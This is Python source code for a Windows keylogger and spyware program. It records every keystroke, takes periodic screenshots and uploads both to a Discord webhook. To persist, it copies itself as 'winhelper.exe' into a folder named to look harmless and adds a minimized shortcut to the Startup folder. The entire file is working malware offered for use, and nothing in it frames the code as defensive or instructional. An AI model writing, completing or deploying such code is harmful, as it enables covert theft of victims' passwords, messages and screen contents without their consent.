import os
import threading
import time
import keyboard
from PIL import ImageGrab
import requests
import getpass
import shutil
import sys
import pythoncom
import winshell
from win32com.client import Dispatch

WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"

user = getpass.getuser()
appdata = os.getenv('APPDATA')
localappdata = os.getenv('LOCALAPPDATA')
startup_path = os.path.join(appdata, "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
log_dir = os.path.join(localappdata, "WinHelper")
log_file = os.path.join(log_dir, "keylog.txt")
screenshot_file = os.path.join(log_dir, "screenshot.png")
script_name = "winhelper.exe"

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_buffer = []
lock = threading.Lock()

def save_log():
    with lock:
        if log_buffer:
            try:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write("".join(log_buffer))
                log_buffer.clear()
            except Exception as e:
                print(f"Error saving log: {e}")

def on_key(event):
    name = event.name
    if len(name) > 1:
        name = f"[{name.upper()}]"
    with lock:
        log_buffer.append(name)

def capture_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(screenshot_file)
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

def send_log_to_discord():
    save_log()
    if not os.path.exists(log_file):
        return
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()
        if not content.strip():
            return

        data = {"content": f"Keylog from user {user}"}
        files = {
            "file": ("keylog.txt", content),
            "screenshot": (os.path.basename(screenshot_file), open(screenshot_file, "rb"), "image/png") if os.path.exists(screenshot_file) else None,
        }
        # Remove None entries
        files = {k: v for k, v in files.items() if v is not None}

        resp = requests.post(WEBHOOK_URL, data=data, files=files)
        if resp.status_code not in (200, 204):
            print(f"Failed to send data: {resp.status_code}")

        # Clear log file after sending
        open(log_file, "w").close()

    except Exception as e:
        print(f"Error sending to Discord: {e}")

def create_startup_shortcut(target_path, shortcut_path):
    try:
        pythoncom.CoInitialize()
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        shortcut.WindowStyle = 7  # Minimized
        shortcut.save()
    except Exception as e:
        print(f"Failed to create startup shortcut: {e}")

def startup_persist():
    if getattr(sys, 'frozen', False):
        current_path = sys.executable
    else:
        current_path = os.path.abspath(__file__)

    dest = os.path.join(log_dir, script_name)
    try:
        if not os.path.exists(dest):
            shutil.copy2(current_path, dest)
    except Exception as e:
        print(f"Failed to copy executable: {e}")

    shortcut_path = os.path.join(startup_path, "WinHelper.lnk")
    if not os.path.exists(shortcut_path):
        create_startup_shortcut(dest, shortcut_path)

def periodic_flush():
    while True:
        time.sleep(60)
        save_log()

def main_loop():
    keyboard.hook(on_key)
    flush_thread = threading.Thread(target=periodic_flush, daemon=True)
    flush_thread.start()
    try:
        while True:
            time.sleep(300)
            capture_screenshot()
            send_log_to_discord()
    except KeyboardInterrupt:
        print("Exiting cleanly.")
        save_log()

if __name__ == "__main__":
    startup_persist()
    main_loop()
